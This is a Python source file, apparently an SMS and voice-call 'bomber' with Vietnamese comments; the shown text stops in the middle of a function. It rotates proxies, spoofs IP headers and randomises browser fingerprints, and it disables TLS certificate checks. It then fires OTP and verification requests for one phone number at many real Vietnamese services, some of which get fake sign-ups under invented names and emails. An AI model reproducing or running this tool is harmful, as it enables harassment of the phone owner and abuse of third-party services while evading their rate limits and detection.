import re
import ssl
import asyncio
import aiohttp
from aiohttp import ClientSession, ClientTimeout, TCPConnector
from aiohttp_socks import ProxyConnector
import random
import time
import functools
import string
from fake_useragent import UserAgent
from typing import List, Dict, Optional, Tuple
import json
import requests

class AnonymityManager:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]

        self.accept_languages = [
            'vi-VN,vi;q=0.9,en;q=0.8,en-US;q=0.7',
            'vi,en-US;q=0.9,en;q=0.8,fr;q=0.7',
            'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3',
            'en-US,en;q=0.9,vi;q=0.8'
        ]

        self.screen_resolutions = [
            '1920x1080', '1366x768', '1440x900', '1536x864', '1280x720'
        ]

    def get_random_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': random.choice(self.accept_languages),
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': str(random.choice([0, 1])),
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': random.choice(['document', 'empty']),
            'Sec-Fetch-Mode': random.choice(['navigate', 'cors']),
            'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'same-site']),
            'Cache-Control': random.choice(['no-cache', 'max-age=0']),
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        }

anonymity_manager = AnonymityManager()

ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE
ssl_context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2

class ProxyManager:
    def __init__(self, proxy_file='proxy.txt'):
        self.proxy_file = proxy_file
        self.http_proxies = []
        self.working_proxies = []
        self.dead_proxies = set()
        self.last_check_time = 0
        self.check_interval = 180  # 3 phút - cache lâu hơn

    async def load_proxies(self):
        try:
            with open(self.proxy_file, 'r') as f:
                proxies = []
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Format: ip:port hoặc username:password@ip:port
                        if '@' in line:
                            auth, addr = line.split('@')
                            proxy_url = f'http://{auth}@{addr}'
                        else:
                            proxy_url = f'http://{line}'
                        proxies.append(proxy_url)
                self.http_proxies = proxies
                print(f"📋 Loaded {len(self.http_proxies)} proxies từ {self.proxy_file}")
        except FileNotFoundError:
            print(f"❌ Không tìm thấy file {self.proxy_file}")
            self.http_proxies = []

    async def check_proxy(self, proxy_url: str) -> bool:
        test_urls = [
            'https://httpbin.org/ip',
            'https://api.ipify.org?format=json',
            'https://ifconfig.me/ip'
        ]

        for url in test_urls:
            try:
                connector = TCPConnector(ssl=ssl_context, limit=1)
                timeout = ClientTimeout(total=5)
                headers = anonymity_manager.get_random_headers()

                async with ClientSession(connector=connector, timeout=timeout) as session:
                    async with session.get(url, 
                                         proxy=proxy_url,
                                         headers=headers,
                                         timeout=ClientTimeout(total=4)) as response:
                        if response.status == 200:
                            # Kiểm tra IP có thay đổi không
                            content = await response.text()
                            if any(ip_part in content for ip_part in proxy_url.split(':')[0].split('.')):
                                continue  # IP trùng với proxy server
                            return True
            except Exception:
                continue
        return False

    async def get_single_proxy(self) -> str:
        if not self.http_proxies:
            await self.load_proxies()

        if not self.http_proxies:
            return None

        # Trước tiên thử proxy từ cache còn hạn
        current_time = time.time()
        if (self.working_proxies and 
            current_time - self.last_check_time <= self.check_interval):
            return random.choice(self.working_proxies)

        # Lấy ngẫu nhiên proxy chưa chết
        available_proxies = [p for p in self.http_proxies if p not in self.dead_proxies]
        if not available_proxies:
            # Reset nếu hết proxy
            self.dead_proxies.clear()
            available_proxies = self.http_proxies.copy()

        # Test song song 3 proxy để tìm proxy sống nhanh hơn
        test_count = min(3, len(available_proxies))
        test_proxies = random.sample(available_proxies, test_count)

        # Test song song với timeout ngắn
        tasks = [self.check_proxy(proxy) for proxy in test_proxies]
        try:
            results = await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=5)

            # Tìm proxy sống đầu tiên
            for proxy, result in zip(test_proxies, results):
                if result is True:
                    # Thêm vào cache
                    if proxy not in self.working_proxies:
                        self.working_proxies.append(proxy)
                        self.last_check_time = current_time
                    return proxy
                else:
                    self.dead_proxies.add(proxy)

        except asyncio.TimeoutError:
            # Nếu timeout, đánh dấu tất cả là chết
            for proxy in test_proxies:
                self.dead_proxies.add(proxy)

        return None  # Không tìm được proxy sống

    async def get_working_proxies(self, count: int = 3) -> List[str]:
        proxies = []
        for _ in range(count):
            proxy = await self.get_single_proxy()
            if proxy:
                proxies.append(proxy)
        return proxies

# Global proxy manager
proxy_manager = ProxyManager()

class EnhancedSession:
    @staticmethod
    async def create_session_with_retry(proxies=None):
        timeout = ClientTimeout(total=20, connect=8)

        if proxies and 'http' in proxies:
            proxy_url = proxies['http']
            if 'socks5://' in proxy_url:
                proxy_url = proxy_url.replace('socks5://', '')
                connector = ProxyConnector.from_url(f'socks5://{proxy_url}')
            else:
                connector = TCPConnector(
                    ssl=ssl_context, 
                    limit=50,
                    limit_per_host=20,
                    keepalive_timeout=30,
                    enable_cleanup_closed=True
                )
        else:
            connector = TCPConnector(
                ssl=ssl_context, 
                limit=50,
                limit_per_host=20,
                keepalive_timeout=30,
                enable_cleanup_closed=True
            )

        # Thêm random headers cho session
        headers = anonymity_manager.get_random_headers()

        session = ClientSession(
            connector=connector,
            timeout=timeout,
            trust_env=True,
            headers=headers
        )

        return session

class SessionManager:
    def __init__(self):
        self.current_sessions = {
            'direct': None,
            'http_proxies': []
        }

    async def get_sessions(self, iteration=1):
        await self.close_sessions()

        direct_session = await EnhancedSession.create_session_with_retry()

        self.current_sessions = {
            'direct': direct_session,
            'http_proxies': []
        }

        print(f"[LẦN {iteration}] Sessions: Direct + HTTP Proxy")

        return direct_session, []

    async def close_sessions(self):
        sessions = []

        direct = self.current_sessions.get('direct')
        if direct is not None:
            sessions.append(direct)

        for session in self.current_sessions.get('http_proxies', []):
            if session is not None:
                sessions.append(session)

        if sessions:
            await asyncio.gather(
                *(session.close() for session in sessions),
                return_exceptions=True
            )

        self.current_sessions = {
            'direct': None,
            'http_proxies': []
        }

session_manager = SessionManager()


async def multi_request_race(
    method,
    url,
    session_direct,
    http_proxy_sessions=None,
    **kwargs
):
    tasks = []
    temp_sessions = []

    async def make_request_enhanced(
        session,
        conn_type,
        proxy_url=None,
        max_retries=3
    ):
        for attempt in range(max_retries):
            start_time = time.time()

            try:
                local_kwargs = kwargs.copy()
                headers = local_kwargs.pop('headers', {}).copy()

                timeout_val = local_kwargs.pop('timeout', 10)
                timeout = ClientTimeout(
                    total=timeout_val + attempt * 2,
                    connect=5
                )

                request_params = {
                    'headers': headers,
                    'timeout': timeout,
                    **local_kwargs
                }

                if proxy_url:
                    request_params['proxy'] = proxy_url

                async with session.request(
                    method,
                    url,
                    **request_params
                ) as response:
                    content = await response.text()

                    return {
                        'success': response.status in (200, 201, 202, 302),
                        'status': response.status,
                        'content': content,
                        'connection': conn_type,
                        'elapsed': time.time() - start_time,
                        'attempt': attempt + 1
                    }

            except Exception as e:
                if attempt == max_retries - 1:
                    return {
                        'success': False,
                        'connection': conn_type,
                        'error': str(e)[:150],
                        'elapsed': time.time() - start_time
                    }

                await asyncio.sleep(1)

        return {
            'success': False,
            'connection': conn_type,
            'error': 'All retries failed'
        }

    if session_direct is not None:
        tasks.append(
            asyncio.create_task(
                make_request_enhanced(
                    session_direct,
                    'direct'
                )
            )
        )

    async def create_proxy_task(proxy_index):
        try:
            proxy_url = await proxy_manager.get_single_proxy()

            if not proxy_url:
                return {
                    'success': False,
                    'connection': f'http_proxy_{proxy_index}',
                    'error': 'No working proxy'
                }

            connector = TCPConnector(
                ssl=ssl_context,
                limit=20
            )

            temp_session = ClientSession(
                connector=connector,
                timeout=ClientTimeout(total=12),
                trust_env=False
            )

            temp_sessions.append(temp_session)

            return await make_request_enhanced(
                temp_session,
                f'http_proxy_{proxy_index}',
                proxy_url
            )

        except Exception as e:
            return {
                'success': False,
                'connection': f'http_proxy_{proxy_index}',
                'error': str(e)[:150]
            }

    for i in range(1, 4):
        tasks.append(
            asyncio.create_task(create_proxy_task(i))
        )

    pending = set(tasks)
    results = []

    try:
        while pending:
            done, pending = await asyncio.wait(
                pending,
                return_when=asyncio.FIRST_COMPLETED
            )

            for task in done:
                try:
                    result = task.result()
                    results.append(result)

                    if result.get('success'):
                        for pending_task in pending:
                            pending_task.cancel()

                        if pending:
                            await asyncio.gather(
                                *pending,
                                return_exceptions=True
                            )

                        return result

                except Exception as e:
                    results.append({
                        'success': False,
                        'error': str(e)[:150]
                    })

        return results[0] if results else {
            'success': False,
            'error': 'No request completed',
            'connection': 'none'
        }

    finally:
        for task in tasks:
            if not task.done():
                task.cancel()

        await asyncio.gather(
            *tasks,
            return_exceptions=True
        )

        if temp_sessions:
            await asyncio.gather(
                *(session.close() for session in temp_sessions),
                return_exceptions=True
            )


async def make_request(method, url, **kwargs):
    direct_session = session_manager.current_sessions['direct']

    if direct_session is None:
        raise RuntimeError(
        )

    return await multi_request_race(
        method,
        url,
        direct_session,
        **kwargs
    )


async def check_current_ips():
    direct_session = session_manager.current_sessions['direct']

    if direct_session is None:
        print("Sessions chưa được khởi tạo")
        return []

    try:
        async with direct_session.get(
            'https://httpbin.org/ip',
            timeout=ClientTimeout(total=8)
        ) as response:
            if response.status == 200:
                data = await response.json()
                result = f"Direct: {data.get('origin', 'Unknown')}"
            else:
                result = f"Direct: Status {response.status}"

    except Exception as e:
        result = f"Direct: Error - {str(e)[:100]}"

    print(f"  → {result}")
    return [result]



import random
import unicodedata

HO = [
    "Nguyễn", "Trần", "Lê", "Phạm", "Hoàng", "Huỳnh", "Phan",
    "Vũ", "Võ", "Đặng", "Bùi", "Đỗ", "Hồ", "Ngô", "Dương"
]

TEN_DEM = [
    "Văn", "Thị", "Minh", "Quốc", "Thanh", "Ngọc", "Gia",
    "Đức", "Hữu", "Anh", "Tuấn", "Bảo", "Kim", "Xuân"
]

TEN = [
    "An", "Bình", "Dũng", "Hùng", "Huy", "Khánh", "Long",
    "Nam", "Phúc", "Quân", "Sơn", "Thành", "Thắng", "Tú",
    "Việt", "Linh", "Lan", "Trang", "Mai", "Hương",
    "Phương", "Nhung", "Thảo", "Yến", "Ngân"
]

def random_vietnamese_name():
    return f"{random.choice(HO)} {random.choice(TEN_DEM)} {random.choice(TEN)}"

def remove_accents(text):
    return ''.join(
        c for c in unicodedata.normalize("NFD", text)
        if unicodedata.category(c) != "Mn"
    )

def generate_email():
    full_name = random_vietnamese_name()
    username = remove_accents(full_name).lower().replace(" ", "")
    username += str(random.randint(10000, 99999))
    return f"{username}@gmail.com"

email = generate_email()

def generate_random_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))

def format_device_id(device_id):
    return f"{device_id[:8]}-{device_id[8:12]}-{device_id[12:16]}-{device_id[16:20]}-{device_id[20:]}"


random_id = generate_random_id()
formatted_device_id = format_device_id(random_id)

def generate_random_user_agent():
    chrome_versions = [
        '143.0.0.0', '142.0.0.0', '141.0.0.0', '140.0.0.0', 
        '139.0.0.0', '138.0.0.0', '137.0.0.0', '136.0.0.0',
        '135.0.0.0', '134.0.0.0', '133.0.0.0', '132.0.0.0'
    ]
    android_versions = [
        'Android 14', 'Android 13', 'Android 12', 'Android 11', 
        'Android 10', 'Android 9', 'Android 8.1', 'Android 8.0'
    ]
    chrome_ver = random.choice(chrome_versions)
    android_ver = random.choice(android_versions)
    return f'Mozilla/5.0 (Linux; {android_ver}; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36'
user_agent = generate_random_user_agent()
chrome_ver = user_agent.split('Chrome/')[1].split(' ')[0]


def to_vn_intl_format(phone):
    phone = (phone or "").strip().replace(" ", "")
    if phone.startswith("+84"):
        return phone
    if phone.startswith("84"):
        return "+" + phone
    if phone.startswith("0"):
        return "+84" + phone[1:]
    return "+84" + phone

async def tv360(phone):
    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': 's%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk',
        'shared-device-id': 'web_d113a986-bdb0-45cd-9638-827d1a7809bb',
        'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'access-token': '',
        'refresh-token': '',
        'msisdn': '',
        'profile': '',
        'user-id': '',
        'session-id': 's%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://tv360.vn',
        'priority': 'u=1, i',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1721479947788',
        'tz': 'Asia/Bangkok',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'msisdn': phone,
    }

    try:

        response = await make_request('POST','https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)

        print(f"TV360 | -> OK         ")
    except Exception:
        print(f"TV360 | ~> Lỗi ")

async def vinwonders(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://booking.vinwonders.com',
        'priority': 'u=1, i',
        'sec-ch-ua': f'"Google Chrome";v="{chrome_ver}", "Chromium";v="{chrome_ver}", "Not A(Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user_agent,
    }

    json_data = {
        'channel': 10,
        'UserName': phone,
        'Type': 1,
        'OtpChannel': 1,
    }


    response = await make_request('POST', 
            'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
            headers=headers,
            json=json_data)

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://booking.vinwonders.com',
        'priority': 'u=1, i',
        'sec-ch-ua': f'"Google Chrome";v="{chrome_ver}", "Chromium";v="{chrome_ver}", "Not A(Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user_agent,
    }

    json_data = {
        'channel': 10,
        'UserName': phone,
        'Type': 2,
        'OtpChannel': 1,
    }

    try:

        response = await make_request('POST', 
            'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
            headers=headers, json=json_data)

        print(f"VINWONDERS | -> OK         ")
    except Exception:
        print(f"VINWONDERS | ~> Lỗi ")

async def kingz(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    json_data = {
    'operationName': 'SendOTP',
    'variables': {
        'phone': phone,
    },
    'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    }
    try:

        response = await make_request('POST', 'https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)

        print(f"KINGZ | -> OK         ")
    except Exception:
        print(f"KINGZ | ~> Lỗi ")

async def bibomart(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://bibomart.com.vn',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': phone,
        'type': 1,
    }

    try:

        response = await make_request('POST', 'https://prod.bibomart.net/customer_account/v2/otp/send', headers=headers, json=json_data)

        print(f"BIBOMART | -> OK         ")
    except Exception:
        print(f"BIBOMART | ~> Lỗi ")

async def vinfastescooter(phone): #ap
    _device_id = '-'.join([
        ''.join(random.choices(string.hexdigits.upper(), k=8)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=12)),
    ])
    _player_id = str(uuid.uuid4())
    headers = {
        'Host': 'escooter-api.vinfast.vn',
        'content-type': 'application/json',
        'accept': 'application/json',
        'app_version': '2.25.0',
        'accept-language': 'vi-VN',
        'platform': 'Ios',
        'player_id': _player_id,
        'user-agent': 'eScooter/2024.1213.1812 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'client_id': 'IOS00000009GNY9TB9YXKKY809QRK5SH',
        'device_id': _device_id,
        'os_version': 'ios15.8.2',
        'client_secret': 'IOS00009GNY9TB9YXKKY809QRK5SH9012345678901234567890123456789654',
        'device_model': 'Iphone 4.7"',
    }

    json_data = {
        'type': 'REGISTRATION',
        'mobile_number': phone,
    }

    try:

        response = await make_request('POST', 
            'https://escooter-api.vinfast.vn/api-gateway/otp-management/v1.0/otp/generate',
            headers=headers,
            json=json_data
        )

        print(f"VINFAST E-SCOOTER | -> OK         ")
    except Exception:
        print(f"VINFAST E-SCOOTER | ~> Lỗi ")
async def babilala(phone):
    headers = {
        'Host': 'api.babilala.vn',
        'phone': phone,
        'accept': '*/*',
        'lang': 'vi',
        'content-type': 'application/x-www-form-urlencoded',
        'x-unity-version': '2019.3.15f1',
        'user-agent': 'babilala/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    try:

        response = await make_request('POST', 'https://api.babilala.vn/api/getOtp', headers=headers)

        print(f"BABILALA | -> OK         ")
    except Exception:
        print(f"BABILALA | ~> Lỗi ")

async def edupia(phone): #ap
    import random as _rnd_e, string as _str_e
    _device_id = '-'.join([
        ''.join(_rnd_e.choices('0123456789ABCDEF', k=8)),
        ''.join(_rnd_e.choices('0123456789ABCDEF', k=4)),
        ''.join(_rnd_e.choices('0123456789ABCDEF', k=4)),
        ''.join(_rnd_e.choices('0123456789ABCDEF', k=4)),
        ''.join(_rnd_e.choices('0123456789ABCDEF', k=12)),
    ])
    _device_name = _rnd_e.choice(['iPhone', 'iPad', 'iPhone Pro', 'iPhone mini'])
    _parent_name = random_vietnamese_name()
    headers = {
        'Host': 'service3.edupia.vn',
        'accept': '*/*',
        'content-type': 'application/json',
        'x-unity-version': '2020.3.48f1',
        'user-agent': 'EDUPIA/3 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
        'access-control-allow-origin': '*',
    }

    json_data = {
        'app_code': 'edupia_cap1',
        'app_version': '4.4.28',
        'device_os': 'Other',
        'device_model': 'iOS1582',
        'user_agent': '',
        'device_id': _device_id,
        'device_name': _device_name,
        'ip': '',
        'user_id': 0,
        'ApiCache': {
            'ip_cache': {
                'client_ip': '',
                'client_ip_long': '',
                'country_code': '',
                'country_name': '',
                'region_name': '',
                'latitude': '',
                'longitude': '',
                'time_zone': '',
                'zip_ocd': '',
            },
        },
        'file': [],
        'parent_name': _parent_name,
        'phone': phone,
        'product_type': '1',
        'deviceId': '',
        'source_register': 'App C1',
        'campaign_name': 'Inhouse_Edupia TH App_Há»�c thá»\xad_V2_Ä�Äƒng kÃ½',
        'product_register': -1,
        'username': '',
        'utm_source': '',
    }

    try:

        response = await make_request('POST', 
            'https://service3.edupia.vn/service/v2/users/2.1/register/create-user-trial',
            headers=headers,
            json=json_data
            )
    except Exception:

        print(f"EDUPIA | ~> Lỗi ")
        return
    cookies = {
        '_ga': 'GA1.2.1688129155.1735460145',
        '_gat_UA-116690073-3': '1',
        '_gcl_au': '1.1.1852251882.1735460145',
        '_gid': 'GA1.2.1381524696.1735460145',
    }

    headers2 = {
        'Host': 'api-cms-core.edupia.vn',
        'accept': '*/*',
        'content-type': 'application/json',
        'x-unity-version': '2020.3.48f1',
        'user-agent': 'EDUPIA/3 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
        'access-control-allow-origin': '*',
    }

    json_data2 = {
        'app_code': 'edupia_cap1',
        'app_version': '4.4.28',
        'device_os': 'Other',
        'device_model': 'iOS1582',
        'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'device_id': _device_id,
        'device_name': _device_name,
        'ip': '',
        'user_id': 0,
        'ApiCache': {
            'ip_cache': {
                'client_ip': '',
                'client_ip_long': '',
                'country_code': '',
                'country_name': '',
                'region_name': '',
                'latitude': '',
                'longitude': '',
                'time_zone': '',
                'zip_ocd': '',
            },
        },
        'file': [],
        'phone': phone,
        'operation': 3,
    }

    try:

        response = await make_request('POST', 
            'https://api-cms-core.edupia.vn/api/v2/authentication/get-vcode',
            cookies=cookies, headers=headers2, json=json_data2)

        print(f"EDUPIA | -> OK         ")
    except Exception:
        print(f"EDUPIA | ~> Lỗi ")

async def shopeecall(phone): #^^ error busy
    headers = {
        'a-csrftoken': '',
        'a-from': 'APC-js',
        'a-lang': 'vi',
        'a-os': 'web',
        'a-timestamp': '1748359089',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://web.dailyshopee.vn',
        'priority': 'u=1, i',
        'referer': 'https://web.dailyshopee.vn/',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Opera";v="119"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user_agent,
    }

    json_data = {
        'phone_number': to_vn_intl_format(phone),
        'is_voice_otp': True,
        'signature': '',
        'device_fingerprint': 'FbhLX235xMwoLaGFzEDyKg==|s6vEQnFz+0VWsV/91r0AOLdKP4IJtTBnfLjqK36QabDyLMY2qsNVpSfNgh+eBidD6NKj20YLK2FMWUOGuHvG|hK7tbKQ7OdxFZ9qZ|08|3',
    }

    try:

        response = await make_request('POST', 
            'https://api.dailyshopee.vn/airpay/v0/apc.account.WebService/SendSignupOTPOPEN',
            headers=headers,
            json=json_data,
            timeout=10 
        )

        print(f"SHOPEE CALL | -> OK         ")
    except Exception:
        print(f"SHOPEE CALL | ~> Lỗi ")

async def vinasun1(phone):
    phone84 = '84' + phone[1:]
    ts = str(int(time.time()))
    udid = '-'.join([
        ''.join(random.choices(string.hexdigits.upper(), k=8)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=12)),
    ])
    headers = {
        'Accept': '*/*',
        'Version': '248',
        'OS': '1',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Content-Type': 'application/json',
        'User-Agent': 'Vinasun/248 CFNetwork/1568.200.51 Darwin/24.1.0',
        'apisig': 'z1ML_B0T_xhDCcZ7V6jFPce4WVpliHDqYcuvFhYlI48',
        'ts': ts,
        'Cookie': 's=',
        'UDID': udid,
    }
    json_data = {
        'UserName': random_vietnamese_name(),
        'Email': generate_email(),
        'Mobile': phone84,
        'Password': ''.join(random.choices(string.ascii_letters + string.digits, k=8)),
        'RegionID': -1,
    }
    try:

        response = await make_request('POST', 'https://vnspassengerapi.hungdat.vn/api/passenger/Register', headers=headers, json=json_data)
        print(f"VINASUN | -> OK         ")
    except Exception:
        print(f"VINASUN | ~> Lỗi ")

async def longchau(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        'x-channel': 'EStore',
    }

    json_data = {
        'phoneNumber': phone,
        'otpType': 0,
        'fromSys': 'WEBKHLC',
    }

    try:

        response = await make_request('POST', 
        'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
        headers=headers,
        json=json_data
    )

        print(f"longchau | -> OK         ")
    except Exception:
        print(f"longchau | ~> Lỗi ")

async def longchau1(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        'x-channel': 'EStore',
    }

    json_data = {
        'phoneNumber': phone,
        'otpType': 1,
        'fromSys': 'WEBKHLC',
    }

    try:

        response = await make_request('POST', 
        'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
        headers=headers,
        json=json_data
    )


        print(f"longchau1 | -> OK         ")
    except Exception:
        print(f"longchau1 | ~> Lỗi ")

async def tiemchunglc(phone):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'apptenantid': '0b7bff7f-acb3-49db-9bef-8bf85697cbc4',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://tiemchunglongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://tiemchunglongchau.com.vn/',
